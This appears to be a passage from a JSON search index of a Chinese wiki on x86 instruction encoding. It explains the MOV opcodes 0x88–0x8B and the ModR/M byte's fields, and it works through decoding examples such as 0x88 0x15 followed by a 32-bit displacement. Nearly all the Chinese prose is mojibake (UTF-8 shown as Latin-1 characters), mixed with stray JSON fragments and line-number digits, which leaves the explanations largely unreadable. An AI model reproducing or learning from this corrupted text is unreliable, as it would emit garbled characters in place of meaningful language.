123456780x88 MOV Eb, Gb Gï¼šé€šç”¨å¯„å­˜å™¨0x89\tMOV Ev, Gv Eï¼šå¯„å­˜å™¨/å†…å­˜0x8A\tMOV Gb, Eb bï¼šå­—èŠ‚0x8B\tMOV Gv, Ev vï¼šWord, doubleword or quadword væ˜¯ç”±å½“å‰CPUæ¨¡å¼å†³å®šçš„ï¼š (1)CPUæ¨¡å¼ä¸º16ä½æ—¶æ˜¯word (2)CPUæ¨¡å¼ä¸º32ä½æ—¶æ˜¯dword (3)CPUæ¨¡å¼ä¸º64ä½æ—¶æ˜¯qword ä»¥0x88ä¸ºä¾‹ï¼Œå°†ä¸€ä¸ª8ä½çš„é€šç”¨å¯„å­˜å™¨ç§»åŠ¨åˆ°ä¸€ä¸ª8ä½çš„å¯„å­˜å™¨/å†…å­˜ä¸­ã€‚GæŒ‡å“ªä¸ªé€šç”¨å¯„å­˜å™¨ï¼ŸEæŒ‡å“ªä¸ªå¯„å­˜å™¨æˆ–å†…å­˜ï¼Ÿæ‰€ä»¥éœ€è¦åœ¨OpCodeåé™„åŠ ä¸€ä¸ªå­—èŠ‚æ¥è¿›è¡Œè¡¥å……è¯´æ˜ï¼Œè¿™1å­—èŠ‚å°±æ˜¯Mod R/Mã€‚Mod R/Mï¼Œ1ä¸ªå­—èŠ‚ï¼Œ8ä½ï¼Œåˆ†æˆä¸‰ä¸ªéƒ¨åˆ† R/Mï¼šä½0-ä½2 Reg/Opcodeï¼šä½3-ä½5 Modï¼šä½6-ä½7 Reg/Opcodeæè¿°æŒ‡ä»¤ä¸­çš„Gï¼Œè¯´æ˜å¯„å­˜å™¨å…·ä½“æŒ‡å“ªä¸ª Modå’ŒR/Mæè¿°æŒ‡ä»¤ä¸­çš„Eéƒ¨åˆ†ï¼Œè¯´æ˜å¯„å­˜å™¨/å†…å­˜å…·ä½“æŒ‡å“ªä¸ª Regå°±æ˜¯ä¸Šå›¾æœ€ä¸Šé¢çš„è¡¨æ ¼ï¼Œç„¶åæ ¹æ®å®½åº¦ï¼Œç¡®è®¤æ˜¯å“ªä¸ªå¯„å­˜å™¨ã€‚æ¯”å¦‚REG=000ï¼Œå®½åº¦æ˜¯byteï¼Œé‚£ä¹ˆå°±æ˜¯è¯»REG=000é‚£åˆ—ï¼Œr8(/r)é‚£ä¸€è¡Œï¼Œå³ALã€‚ Modæœ‰00ï¼Œ01ï¼Œ10ï¼Œ11å››ç§å¯èƒ½ï¼Œ00ï¼Œ01ï¼Œ10éƒ½æ˜¯[]é€šè¿‡å¯„å­˜å™¨è¿›è¡Œå†…å­˜å¯»å€ã€‚11ç›´æ¥æ“ä½œå¯„å­˜å™¨ã€‚ ä¾‹1 è¿˜æ˜¯ä»¥0x88ä¸ºä¾‹ï¼ŒOpCodeä¸º0x88æ—¶ï¼Œåé¢è‚¯å®šè¿˜æœ‰1å­—èŠ‚çš„Mod R/Mï¼Œå‡è®¾ä¸º01ã€‚é‚£ä¹ˆ0x88 0x01æ‹†è§£å¦‚ä¸‹ï¼š 123456780x88 0x01 MOV Eb, Gb1.æ“ä½œæ•°å®½åº¦æ˜¯byte2.æ‹†ModR/M (1)Reg/Codeä¸º0ï¼Œè¡¨ç¤º0å·å¯„å­˜å™¨ï¼Œå†å› ä¸ºæ“ä½œæ•°å®½åº¦æ˜¯byteï¼Œæ‰€ä»¥æ˜¯AL (2)Modæ˜¯00ï¼Œå†…å­˜å¯»å€;R/Mæ˜¯1ï¼Œ1å·å¯„å­˜å™¨ï¼ŒECX(ecxmé»˜è®¤æ˜¯dsä½œä¸ºæ®µå¯„å­˜å™¨å¯»å€) ç»¼ä¸Šï¼Œ0x88 0x01è¡¨ç¤ºçš„æŒ‡ä»¤æ˜¯ mov byte ptr ds:[ecx],al ä¸Šé¢æ˜¯é€šè¿‡è‡ªå·±è®°çš„å¯„å­˜å™¨çš„é¡ºåºçš„å‡ºæ¥çš„ã€‚ä¹Ÿå¯ä»¥æŸ¥è¡¨ï¼š Regä¸º0ï¼Œå®½åº¦æ˜¯å­—èŠ‚ï¼Œæ‰€ä»¥REG=000é‚£ä¸€åˆ—ï¼Œr8(/r)é‚£è¡Œï¼ŒæŸ¥è¡¨å¾—AL Modæ˜¯00ï¼ŒR/Mæ˜¯001ï¼ŒæŸ¥è¡¨å¾—[ECX] æ‰€ä»¥ï¼Œ0x88 0x01è¡¨ç¤ºçš„æŒ‡ä»¤æ˜¯mov byte ptr ds:[ecx],al ä¾‹2 0x88 0x15æ˜¯ä»€ä¹ˆæŒ‡ä»¤ï¼Ÿ 123456780x88 0x15 MOV Eb, Gb1.æ“ä½œæ•°å®½åº¦æ˜¯byte2.æ‹†ModR/M 0001 0101-&gt;00 010 101 (1)Reg/Codeä¸º010ï¼Œè¡¨ç¤º2å·å¯„å­˜å™¨ï¼Œå†å› ä¸ºæ“ä½œæ•°å®½åº¦æ˜¯byteï¼Œæ‰€ä»¥æ˜¯dl (2)Modæ˜¯00ï¼Œä»¥å¯„å­˜å™¨è¿›è¡Œå†…å­˜å¯»å€;R/Mæ˜¯101ï¼Œ5å·å¯„å­˜å™¨ï¼Œebp(ebpé»˜è®¤æ˜¯ç”¨ssä½œä¸ºæ®µå¯„å­˜å™¨è¿›è¡Œå¯»å€) ç»¼ä¸Šï¼Œ0x88 0x15è¡¨ç¤ºçš„æŒ‡ä»¤æ˜¯ mov byte ptr ss:[ebp],dl ä¸Šé¢æ˜¯é€šè¿‡è‡ªå·±è®°çš„å¯„å­˜å™¨çš„é¡ºåºæ¨ç®—å‡ºæ¥çš„ï¼Œä½†æ˜¯æŸ¥è¡¨ï¼Œå‘ç°Mmod=00ï¼ŒR/M=101é‚£è¡Œæ˜¯disp32ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºåœ¨æ ˆå¸§ä¸­ï¼ŒEBPæŒ‡å‘æ ˆåº•ï¼Œ[ebp]é€šå¸¸å­˜å‚¨ä¸Šä¸€ä¸ªæ ˆå¸§çš„EBPï¼Œæ‰€ä»¥[EBP]è¿›è¡Œå¯»å€å–å€¼æ²¡æœ‰æ„ä¹‰ï¼ŒIntelå°†è¿™ä¸ªç¼–ç åºŸå¼ƒï¼Œæ”¹ä¸ºç”¨32ä½çš„ç«‹å³æ•°è¿›è¡Œå¯»å€ã€‚ä¹Ÿå°±æ˜¯è¯´88 15åè¿˜ä¼šå†è·Ÿä¸€ä¸ª32ä½ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œæ”¾åˆ°[]ä¸­è¿›è¡Œå¯»å€ã€‚ ä¾‹188 15 12 34 56 78 çš„æ±‡ç¼–æŒ‡ä»¤ä¸º MOV BYTE PTR DS:[78563412], DL æ­¤å¤–ï¼Œåœ¨æ ˆå¸§ä¸­ï¼Œè¿˜æœ‰ESPï¼ŒESPæŒ‡å‘æ ˆé¡¶ï¼Œæ˜¯æµ®åŠ¨çš„ï¼Œä¸ç¡®å®šçš„ï¼ŒInterå°†è¿™ä¸ªç¼–ç åºŸå¼ƒï¼Œç”±å¦å¤–çš„æ ¼å¼æ¥è¯´æ˜ã€‚åœ¨è¡¨æ ¼ä¸­æŸ¥åˆ°çš„æ˜¯[--][--]ã€‚"},{"title":"å¼•è¨€","path":"/wiki/x86InstructionSet/å¼•è¨€_x86æŒ‡ä»¤æ ¼å¼.html","content":"x86æŒ‡ä»¤ç¼–ç åˆ†ä¸º6ä¸ªéƒ¨åˆ† å‰ç¼€æŒ‡ä»¤ï¼ˆInstrction Prefixexï¼‰ï¼Œå¯é€‰ Opcode å‰ç¼€æŒ‡ä»¤å¯é€‰ï¼Œé‚£CPUå¦‚ä½•çŸ¥é“ä¸€æ¡æŒ‡ä»¤ä¸­å‰é¢éƒ¨åˆ†æ˜¯å‰ç¼€æŒ‡ä»¤è¿˜æ˜¯OpCodeï¼ŸCPUæ˜¯æ ¹æ®è¿™ä¸ªæŒ‡ä»¤çš„å€¼åˆ¤æ–­çš„ã€‚æ¯”å¦‚55ï¼ˆpush ebpï¼‰ï¼Œå°±æ˜¯Opcodeï¼Œè€Œä¸æ˜¯å‰ç¼€æŒ‡ä»¤ã€‚å‰ç¼€æŒ‡ä»¤å°±é‚£ä¹ˆå‡ ä¸ª"}]